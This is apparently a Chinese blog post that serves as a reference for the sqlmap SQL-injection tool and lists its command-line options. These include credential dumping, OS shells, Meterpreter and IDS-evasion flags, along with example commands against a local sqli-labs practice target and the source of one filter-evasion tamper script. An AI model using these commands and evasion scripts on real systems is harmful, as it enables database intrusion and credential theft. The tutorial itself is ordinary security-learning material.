<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":250,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":"default","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="sqlmap 详解   sqlmap 指令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394">
<meta property="og:type" content="article">
<meta property="og:title" content="sqlmaptamper">
<meta property="og:url" content="http://example.com/2024/04/02/sqlmaptamper/index.html">
<meta property="og:site_name" content="blog">
<meta property="og:description" content="sqlmap 详解   sqlmap 指令12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://y4er.com/img/uploads/20191118212606.png">
<meta property="og:image" content="https://y4er.com/img/uploads/20191118212624.png">
<meta property="og:image" content="https://y4er.com/img/uploads/20191118212641.png">
<meta property="og:image" content="https://y4er.com/img/uploads/20191118212702.png">
<meta property="og:image" content="https://y4er.com/img/uploads/20191118212747.png">
<meta property="og:image" content="https://y4er.com/img/uploads/20191118212800.png">
<meta property="article:published_time" content="2024-04-02T13:39:44.000Z">
<meta property="article:modified_time" content="2024-04-04T17:32:39.627Z">
<meta property="article:author" content="小zhou">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://y4er.com/img/uploads/20191118212606.png">

<link rel="canonical" href="http://example.com/2024/04/02/sqlmaptamper/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>sqlmaptamper | blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/02/sqlmaptamper/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
      <meta itemprop="name" content="小zhou">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          sqlmaptamper
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-02 21:39:44" itemprop="dateCreated datePublished" datetime="2024-04-02T21:39:44+08:00">2024-04-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-04-05 01:32:39" itemprop="dateModified" datetime="2024-04-05T01:32:39+08:00">2024-04-05</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>7.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>27 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>sqlmap 详解</p>
<!--mroe-->

<h1 id="sqlmap-指令"><a href="#sqlmap-指令" class="headerlink" title="sqlmap 指令"></a>sqlmap 指令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><span class="line">sqlmap常用命令</span><br><span class="line">-h                                           显示基本帮助信息</span><br><span class="line"></span><br><span class="line">-hh                                         显示高级帮助信息</span><br><span class="line"></span><br><span class="line">--version                                显示版本号</span><br><span class="line"></span><br><span class="line">-v                                           详细等级（0-6 默认 1）</span><br><span class="line"></span><br><span class="line">                                              0：只显示python错误以及重要信息</span><br><span class="line"></span><br><span class="line">                                              1：显示信息以及警告</span><br><span class="line"></span><br><span class="line">                                              2：显示debug消息</span><br><span class="line"></span><br><span class="line">                                              3：显示注入payload</span><br><span class="line"></span><br><span class="line">                                              4：显示http请求</span><br><span class="line"></span><br><span class="line">                                              5：显示http响应头·</span><br><span class="line"></span><br><span class="line">                                              6：显示http响应内容</span><br><span class="line"></span><br><span class="line">Target：                                </span><br><span class="line"></span><br><span class="line">-u                                          指定目标url</span><br><span class="line"></span><br><span class="line">-d                                          直接连接数据库</span><br><span class="line"></span><br><span class="line">-l                                           从burp代理日志的解析目标</span><br><span class="line"></span><br><span class="line">-r                                           从文件中加载http请求</span><br><span class="line"></span><br><span class="line">-g                                          从google dork的结果作为目标url</span><br><span class="line"></span><br><span class="line">-c                                          从INI配置文件中加载选项</span><br><span class="line"></span><br><span class="line">Request</span><br><span class="line"></span><br><span class="line">-A                                         指定user-agent头</span><br><span class="line"></span><br><span class="line">-H                                         额外的header</span><br><span class="line"></span><br><span class="line">-method=                              指定HTTP方法（GET/POST）</span><br><span class="line"></span><br><span class="line">--data=                                 通过POST提交数据    </span><br><span class="line"></span><br><span class="line">--param-del=                        指定参数分隔符</span><br><span class="line"></span><br><span class="line">--cookie=                              指定cookie的值</span><br><span class="line"></span><br><span class="line">--cookie-del=                        指定cookie分隔符</span><br><span class="line"></span><br><span class="line">--drop-set-cookie                  扔掉response中的set-cookie头</span><br><span class="line"></span><br><span class="line">--random-agent                    使用随机的user-agent头</span><br><span class="line"></span><br><span class="line">--host=                                  设置host头 </span><br><span class="line"></span><br><span class="line">--referer=                              指定referer头</span><br><span class="line"></span><br><span class="line">--headers=                            额外的headers</span><br><span class="line"></span><br><span class="line">--auth-type=                          http认证类型（Basic，NTLM，Digest）</span><br><span class="line"></span><br><span class="line">--auith-cred=                         http认证凭证（账号：密码）</span><br><span class="line"></span><br><span class="line">--ignore-proxy                       忽略系统代理（常用于扫描本地文件）</span><br><span class="line"></span><br><span class="line">--proxy=                                使用代理</span><br><span class="line"></span><br><span class="line">--proxy-cred=                        代理认证证书（账号：密码）</span><br><span class="line"></span><br><span class="line">--delay=                                 设置延迟时间（两个请求之间）</span><br><span class="line"></span><br><span class="line">--timeout=                              超时时来连接前等待（默认 30）</span><br><span class="line"></span><br><span class="line">--retries=                                连接超时时重试次数（默认 3）</span><br><span class="line"></span><br><span class="line">--randomize=                         随机更改指定的参数的值</span><br><span class="line"></span><br><span class="line">--safe-url=                             在测试期间经常访问的URL</span><br><span class="line"></span><br><span class="line">--safe-post=                           POST数据发送到安全的URL</span><br><span class="line"></span><br><span class="line">--safe-freq=                           两次请求之间穿插一个安全的URL   </span><br><span class="line"></span><br><span class="line">--skip-urlencode                    跳过payload数据的URL编码</span><br><span class="line"></span><br><span class="line">--chunked                             使用HTTP分块传输加密POST请求</span><br><span class="line"></span><br><span class="line">--hpp                                    使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）</span><br><span class="line"></span><br><span class="line">--force-ssl                             强制使用SSL/HTTPS</span><br><span class="line"></span><br><span class="line">--eval=value                         请求之前提供Python代码（eg：&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）</span><br><span class="line"></span><br><span class="line">Optimization</span><br><span class="line"></span><br><span class="line">-o                                         打开所有优化开关</span><br><span class="line"></span><br><span class="line">--predict-output                   预测输出（与--threads不兼容）</span><br><span class="line"></span><br><span class="line">--keep-alive                         建立长久的HTTP(S)连接 (与--proxy不兼容)</span><br><span class="line"></span><br><span class="line">--null-connection                 空连接</span><br><span class="line"></span><br><span class="line">--threads=value                  设置线程(默认 1)</span><br><span class="line"></span><br><span class="line">Injection</span><br><span class="line"></span><br><span class="line">-p                                       指定测试参数</span><br><span class="line"></span><br><span class="line">--skip=                               跳过指定参数的测试</span><br><span class="line"></span><br><span class="line">--skip-static                        跳过测试静态的参数</span><br><span class="line"></span><br><span class="line">--dbms=                             指定具体DBMS</span><br><span class="line"></span><br><span class="line">--os=                                  指定DBMS操作系统</span><br><span class="line"></span><br><span class="line">--invalid-bignum                使用大数字使值无效</span><br><span class="line"></span><br><span class="line">--invalid-logical                  使用逻辑符使值无效</span><br><span class="line"></span><br><span class="line">--invalid-string                   使用字符串使值无效</span><br><span class="line"></span><br><span class="line">--no-cast                             关闭payload铸造机制</span><br><span class="line"></span><br><span class="line">--no-escape                       关闭字符转义机制（默认自动开启）</span><br><span class="line"></span><br><span class="line">--prefix=                             加入payload前缀</span><br><span class="line"></span><br><span class="line">--suffix=                              加入payload后缀</span><br><span class="line"></span><br><span class="line">--tamper=                          指定使用的脚本</span><br><span class="line"></span><br><span class="line">Detectiong</span><br><span class="line"></span><br><span class="line">--level=                              指定测试的等级（1-5 默认为1）</span><br><span class="line"></span><br><span class="line">--risk=                               指定测试的风险（0-3 默认为1）</span><br><span class="line"></span><br><span class="line">--string=                            登录成功时，页面所含有的“关键字” 用于证明已经登录成功</span><br><span class="line"></span><br><span class="line">--not-string=                      登录成功时，页面所含有的“关键字” 用于证明已经登录失败</span><br><span class="line"></span><br><span class="line">--code=                             查询为真时，匹配的HTTP代码</span><br><span class="line"></span><br><span class="line">--smart                              当有大量检测目标时，只选择基于错误的检测结果</span><br><span class="line"></span><br><span class="line">--text-only                         仅基于文本内容比较网页</span><br><span class="line"></span><br><span class="line">--titles                               仅基于标题比较网页</span><br><span class="line"></span><br><span class="line">Techniques</span><br><span class="line"></span><br><span class="line">--technique=                      指定sql注入技术（默认BEUSTQ）</span><br><span class="line"></span><br><span class="line">--time-sec=                        基于时间注入检测相应的延迟时间（默认为5秒）</span><br><span class="line"></span><br><span class="line">--union-clos=                     进行查询时，指定列的范围</span><br><span class="line"></span><br><span class="line">--union-char=                    指定暴力破解列数的字符</span><br><span class="line"></span><br><span class="line">Fingerprint</span><br><span class="line"></span><br><span class="line">-f                                      查询目标DBMS版本指纹信息</span><br><span class="line"></span><br><span class="line">Emuneration</span><br><span class="line"></span><br><span class="line">-a                                    查询所有  </span><br><span class="line"></span><br><span class="line">-b                                    查询目标DBMS banner信息</span><br><span class="line"></span><br><span class="line">--current-user                 查询目标DBMS当前用户</span><br><span class="line"></span><br><span class="line">--current-db                    查询目标DBMS当前数据库</span><br><span class="line"></span><br><span class="line">--is-dba                          查询目标DBMS当前用户是否为DBA</span><br><span class="line"></span><br><span class="line">--users                            枚举目标DBMS所有的用户</span><br><span class="line"></span><br><span class="line">--paswords                     枚举目标DBMS用户密码哈希值</span><br><span class="line"></span><br><span class="line">--privileges                     枚举目标DBMS用户的权限</span><br><span class="line"></span><br><span class="line">--roles                            枚举DBMS用户的角色</span><br><span class="line"></span><br><span class="line">--dbs                              枚举DBMS所有的数据库</span><br><span class="line"></span><br><span class="line">--tables                          枚举DBMS数据库中所有的表</span><br><span class="line"></span><br><span class="line">--columns                      枚举DBMS数据库表中所有的列</span><br><span class="line"></span><br><span class="line">--count                         检索表的条目的数量</span><br><span class="line"></span><br><span class="line">--dump                         存储DBMS数据库的表中的条目</span><br><span class="line"></span><br><span class="line">--dump-all                     存储DBMS所有数据库表中的条目</span><br><span class="line"></span><br><span class="line">--D db                          指定进行枚举的数据库名称</span><br><span class="line"></span><br><span class="line">--T   table                     指定进行枚举的数据库表名称</span><br><span class="line"></span><br><span class="line">--C   column                 指定进行枚举的数据库列名称</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs          枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--sql-query                    指定查询的sql语句</span><br><span class="line"></span><br><span class="line">--sql-shell                     提示输入一个交互式sql shell</span><br><span class="line"></span><br><span class="line">Brute force</span><br><span class="line"></span><br><span class="line">--common-tables                       暴力破解表 </span><br><span class="line"></span><br><span class="line">--common-colomns                    暴力破解列</span><br><span class="line"></span><br><span class="line">File system access</span><br><span class="line"></span><br><span class="line">--file-read                            从目标数据库管理文件系统读取文件</span><br><span class="line"></span><br><span class="line">--file-write                           上传文件到目标数据库管理文件系统</span><br><span class="line"></span><br><span class="line">--file-dest                             指定写入文件的绝对路径</span><br><span class="line"></span><br><span class="line">--os-cmd=                           执行操作系统命令</span><br><span class="line"></span><br><span class="line">--os-shell                            交互式的系统shell</span><br><span class="line"></span><br><span class="line">--os-pwn                             获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-smbrelay                    一键 获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line"></span><br><span class="line">--os-bof                              储存过程缓冲区溢出利用</span><br><span class="line"></span><br><span class="line">--os-esc                              数据库进程用户权限提升</span><br><span class="line"></span><br><span class="line">--msf-path=                        Metasploit  Framework本地安装路径</span><br><span class="line"></span><br><span class="line">General</span><br><span class="line"></span><br><span class="line">-s                                     sqlite会话文件保存位置</span><br><span class="line"></span><br><span class="line">-t                                      记录所有HTTP流量到指定文件中</span><br><span class="line"></span><br><span class="line">--batch                             测试过程中， 执行所有默认配置</span><br><span class="line"></span><br><span class="line">--charset=v                      强制用于数据检索的字符编码 </span><br><span class="line"></span><br><span class="line">--crawl=                           从目标URL开始爬取网站</span><br><span class="line"></span><br><span class="line">--crawl-exclude=              禁止爬取某个页面（eg：logout）</span><br><span class="line"></span><br><span class="line">--csv-del=                        指定CSV输出中使用的的字符</span><br><span class="line"></span><br><span class="line">--dump-format=               储存数据的方式（CSV(default)，HTML，SQLITE）</span><br><span class="line"></span><br><span class="line">--flush-session                 刷新当前目标的会话文件</span><br><span class="line"></span><br><span class="line">--fresh-queries                 忽略会话文件中储存的查询结果，重新查询</span><br><span class="line"></span><br><span class="line">--hex                                使用DBMS hex函数进行数据检索</span><br><span class="line"></span><br><span class="line">--outpout-dir=                  自定义输出目录</span><br><span class="line"></span><br><span class="line">--save=                            保存选项到INI配置文件中</span><br><span class="line"></span><br><span class="line">--scope=                          使用正则表达式从提供的日志中guo&#x27;l</span><br><span class="line"></span><br><span class="line">--alert                               再找到SQL注入时运行主机操作系统命令</span><br><span class="line"></span><br><span class="line">--purge-output                  安全的从输出目录中删除所有内容</span><br><span class="line"></span><br><span class="line">--sqlmap-shell                  提示输入交互式sqlmap  shell</span><br><span class="line"></span><br><span class="line">--update                           更新sqlmap</span><br><span class="line"></span><br><span class="line">sqlmap注入技术简介</span><br><span class="line">--technique=     （默认全部使用）</span><br><span class="line"></span><br><span class="line">B       基于布尔的盲注</span><br><span class="line"></span><br><span class="line">T       基于时间的盲注</span><br><span class="line"></span><br><span class="line">E      基于报错的注入</span><br><span class="line"></span><br><span class="line">U      基于UNION查询注入</span><br><span class="line"></span><br><span class="line">S      基于多语句查询注入</span><br><span class="line"></span><br><span class="line">sqlmap获取目标方式</span><br><span class="line">1.指定目标url</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br><span class="line"></span><br><span class="line">2.从文件中获取多个url</span><br><span class="line"></span><br><span class="line">sqlmap -m 1.txt</span><br><span class="line">3.从文件中加载HTTP请求</span><br><span class="line">sqlmap -r  url.txt</span><br></pre></td></tr></table></figure>

<h1 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="sqlmap-脚本详解"><a href="#sqlmap-脚本详解" class="headerlink" title="sqlmap 脚本详解"></a>sqlmap 脚本详解</h1><h2 id="0eunion"><a href="#0eunion" class="headerlink" title="0eunion"></a>0eunion</h2><p>作用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces instances of &lt;int&gt; UNION with &lt;int&gt;e0UNION</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Requirement:</span></span><br><span class="line"><span class="string">        * MySQL</span></span><br><span class="line"><span class="string">        * MsSQL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Reference: https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;1 UNION ALL SELECT&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;1e0UNION ALL SELECT&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&quot;(?i)(\d+)\s+(UNION )&quot;</span>, <span class="string">r&quot;\g&lt;1&gt;e0\g&lt;2&gt;&quot;</span>, payload) <span class="keyword">if</span> payload <span class="keyword">else</span> payload</span><br></pre></td></tr></table></figure>



<h2 id="apostrophemask"><a href="#apostrophemask" class="headerlink" title="apostrophemask"></a>apostrophemask</h2><p>把’使用%EF%BC%87进行替换【类似款字节】</p>
